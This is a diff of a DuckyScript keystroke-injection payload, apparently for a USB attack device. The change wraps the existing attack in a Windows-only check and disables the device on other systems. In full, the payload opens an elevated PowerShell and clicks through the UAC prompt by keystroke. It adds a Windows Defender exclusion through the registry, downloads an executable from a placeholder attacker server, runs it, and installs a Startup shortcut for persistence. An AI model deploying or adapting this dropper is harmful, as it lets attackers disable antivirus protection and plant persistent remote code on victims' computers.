@@ -50,37 +50,44 @@ EXTENSION PASSIVE_WINDOWS_DETECT
         END_IF
     END_REM
 END_EXTENSION
-DELAY 100
-GUI r
-DELAY 500
-STRING powershell
-DELAY 500
-CTRL SHIFT ENTER
-DELAY 1000
-LEFTARROW
-DELAY 1000
-ENTER
-DELAY 1500
-REM Create Cache folder in Windows/temp
-STRINGLN mkdir "$env:windir\temp\Cache"
-DELAY 500
+REM Current Payload does not use extention at all, you could remove it or do the proposed change
+IF ($_OS == WINDOWS) THEN
+    GUI r
+    DELAY 500
+    STRING powershell
+    DELAY 500
+    CTRL SHIFT ENTER
+    DELAY 1000
+    LEFTARROW
+    DELAY 1000
+    ENTER
+    DELAY 1500
+    REM Create Cache folder in Windows/temp
+    STRINGLN mkdir "$env:windir\temp\Cache"
+    DELAY 500
 
-REM Add exclusion in Defender for Cache folder via registry manipulation
-STRINGLN Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force'
-DELAY 500
+    REM Add exclusion in Defender for Cache folder via registry manipulation
+    STRINGLN Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force'
+    DELAY 500
 
-REM Download payload from VPS Invoke-WebRequest
-STRINGLN Invoke-WebRequest -Uri "http://#VPSIPHERE:#PORT/#EXE_NAME" -OutFile "$env:windir\temp\Cache\#EXE_NAME"
-DELAY 3000
+    REM Download payload from VPS Invoke-WebRequest
+    STRINGLN Invoke-WebRequest -Uri "http://#VPSIPHERE:#PORT/#EXE_NAME" -OutFile "$env:windir\temp\Cache\#EXE_NAME"
+    DELAY 3000
 
-REM Execute the downloaded payload
-STRINGLN Start-Process "$env:windir\temp\Cache\#EXE_NAME"
-DELAY 500
+    REM Execute the downloaded payload
+    STRINGLN Start-Process "$env:windir\temp\Cache\#EXE_NAME"
+    DELAY 500
 
-REM Add #EXE_NAME to startup
-STRINGLN $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\#EXE_NAME";$s.Save()
-DELAY 500
+    REM Add #EXE_NAME to startup
+    STRINGLN $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\#EXE_NAME";$s.Save()
+    DELAY 500
 
-STRING EXIT
-DELAY 300
-ENTER
+    STRING EXIT
+    DELAY 300
+    ENTER
+    DELAY 100
+ELSE
+    REM Could use this else to disable payload when potentially attacking a linux or Mac system unintentionally
+    ATTACKMODE OFF
+END_IF
+
